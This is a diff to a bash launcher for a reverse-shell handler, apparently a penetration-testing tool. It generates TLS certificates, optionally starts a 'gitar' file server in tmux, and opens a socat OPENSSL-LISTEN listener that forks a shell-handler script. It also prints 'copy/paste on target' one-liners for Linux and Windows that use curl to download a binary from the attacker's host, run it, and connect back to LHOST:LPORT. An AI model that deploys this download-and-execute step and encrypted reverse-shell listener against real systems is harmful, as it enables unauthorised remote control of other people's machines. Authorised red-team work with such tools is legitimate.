@@ -27,12 +27,11 @@ for i in "$@"; do
     esac
 done
 
-#default value & envar
+# Default value + envvar
 
 SCRIPTNAME=$(readlink -f "$0")
 BASEDIR=$(dirname "$SCRIPTNAME")
 
-echo "$BASEDIR baseeee"
 
 if [[ -z "$WEBPORT" ]];
 then
@@ -59,6 +58,7 @@ else
     SCRIPT=$BASEDIR"/socat-forker.sh"
 fi
 
+# TLS part
 echo -e "\n\n\n[+] Generating tls certs and keys"
 if [ -f server.pem ]; then
     echo "[+] Files already exist, using server.pem"
@@ -71,8 +71,11 @@ fi
 cp ${SCRIPT}.tpl ${SCRIPT}
 
 if [[ "$GITAR" ]]; then
-    echo "[+] gitar shortcuts enabled on reverse shell"
-    sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
+    #gitar shortcut is not available with windows
+    if [[ ! $WINDOWS ]]; then
+        echo "[+] gitar shortcuts enabled on reverse shell"
+        sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
+    fi
     echo "[+] launch gitar server"
     SECRET=$RANDOM
     tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret ${SECRET}"
@@ -93,18 +96,20 @@ else
 fi
 
 echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
+DOWNLOAD_URL=""
 if [[ "$GITAR" ]]; then
-	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/${SECRET}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    DOWNLOAD_URL=${LHOST}:${WEBPORT}/${SECRET}/pull/${BINARY}
 else
-    echo
-    echo "(🪟) curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
-    echo "(🐧) curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    DOWNLOAD_URL=${LHOST}:${WEBPORT}/${BINARY}
 fi
 
-# echo "[*] Enjoy meal!"
 
+# LISTEN
+echo
 if [[ "$WINDOWS" ]]; then
-    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./${SCRIPT},pty
+    echo "(🪟) curl -O $DOWNLOAD_URL && .\\${BINARY} ${LHOST}:${LPORT}"
+    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
 else
-    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./${SCRIPT},pty,raw,echo=0
+    echo "(🐧) curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
 fi
